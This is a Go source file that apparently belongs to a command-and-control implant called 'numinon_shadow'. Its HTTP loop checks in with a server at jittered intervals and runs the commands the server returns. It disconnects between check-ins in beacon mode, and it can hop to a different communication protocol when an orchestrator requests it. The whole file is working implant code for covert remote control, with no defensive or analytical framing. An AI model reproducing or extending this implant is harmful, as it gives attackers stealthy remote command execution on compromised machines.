package agent

import (
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/models"
	"time"
)

// runHttpLoop handles the main check-in cycle for HTTP-based protocols using time.Sleep and jitter.
func (a *Agent) runHttpLoop() error {
	logPfx := "|🐇 ATTEMPT HOP|"
	log.Println("|AGENT LOOP HTTP|-> HTTP loop started.")

	for {
		// CHECK IF A HOP COMMAND HAS BEEN ISSUED AND ATTEMPT HOP
		// --- Hop Check and Delegate to attemptHopSequence ---
		a.hopMutex.Lock()
		needsToHop := a.requestingHop         // hop orchestrator will set this to true
		configPtrForHop := a.pendingHopConfig // Get pointer to the new config we created
		if needsToHop && configPtrForHop != nil {
			localConfigCopyForHop := *configPtrForHop // Make a copy before releasing mutex & resetting flags
			a.requestingHop = false                   // reset the flag - "consume once"
			a.pendingHopConfig = nil                  // reset the new config for future use
			a.hopMutex.Unlock()                       // Unlock before calling attemptHopSequence

			hopSuccessful, familyChanged, criticalHopErr := a.attemptHopSequence(localConfigCopyForHop, true /* currentLoopTypeIsHttp */)
			if criticalHopErr != nil {
				log.Printf("|❗CRIT %s| Critical error during hop sequence commit: %v. Terminating loop.", logPfx, criticalHopErr)
				return criticalHopErr // Fatal error during hop
			}
			if hopSuccessful {
				if familyChanged {
					log.Printf("%s Hop successful, protocol family changed. Returning ErrHopProtocolTypeChange.", logPfx)
					return ErrHopProtocolTypeChange
				}
				log.Printf("%s Hop successful, protocol family HTTP. Continuing loop immediately.", logPfx)
				continue // Hop done, new HTTP comm active, restart loop iteration
			}
			// If hopSuccessful is false, it means hop was aborted safely, continue with old communicator.
			log.Printf("%s Hop sequence aborted or failed validation. Continuing with current communicator %s.", logPfx, a.communicator.Type())
		} else {
			a.hopMutex.Unlock() // Must unlock if not hopping
		}

		select {
		// This will come from our Stop() function
		case <-a.stopChan:
			log.Println("|AGENT LOOP HTTP|-> Stop signal received, exiting HTTP loop.")
			return nil
		default:
			sleepDuration := a.calculateSleepWithJitter()

			// PERFORM CHECK-IN
			log.Println("|AGENT LOOP HTTP|-> Performing check-in...")

			responseBytes, err := a.communicator.CheckIn()
			if err != nil {
				log.Printf("|❗ERR AGENT LOOP HTTP| CheckIn failed: %v", err)
				// Error during check-in, proceed to sleep and retry next iteration
				time.Sleep(sleepDuration)
				continue
			}

			// PROCESS CHECKIN
			// First, unmarshall Response Body

			var taskResp models.ServerTaskResponse

			err = json.Unmarshal(responseBytes, &taskResp)
			if err != nil {
				log.Println("Failed to unmarshal response body from HTTP request")
				time.Sleep(sleepDuration)
				continue
			}

			// Next, check if there is no task
			// Note we need to continue the loop to disconnect if it's a beacon mode, sleep etc
			if !taskResp.TaskAvailable {
				log.Println("|AGENT LOOP HTTP|-> No task from server, going back to sleep.")
			}

			// call executeTask if we do have a task
			if taskResp.TaskAvailable {
				log.Println("|AGENT LOOP HTTP|-> Task is available.")
				log.Printf("|AGENT LOOP HTTP|-> Task received (ID: %s, Cmd: %s). Executing...", taskResp.TaskID, taskResp.Command)
				a.executeTask(taskResp) // Execute the task (which will send results internally)
			}

			// RIGHT BEFORE WE SLEEP WE DISCONNECT
			if a.config.BeaconMode {
				log.Println("|AGENT LOOP HTTP|-> Beacon Mode is ENABLED, calling Disconnect()")
				err := a.communicator.Disconnect()
				if err != nil {
					fmt.Println("|AGENT LOOP HTTP|-> Beacon Mode failed to called Disconnect")
				}

			}
			// ENDS HERE

			log.Printf("|AGENT LOOP HTTP|-> Sleeping for %v...", sleepDuration)
			select {
			case <-time.After(sleepDuration):
				// Continue loop
			case <-a.stopChan:
				log.Println("|AGENT LOOP HTTP|-> Stop signal received during sleep")
				return nil
			}
		}
	}
}
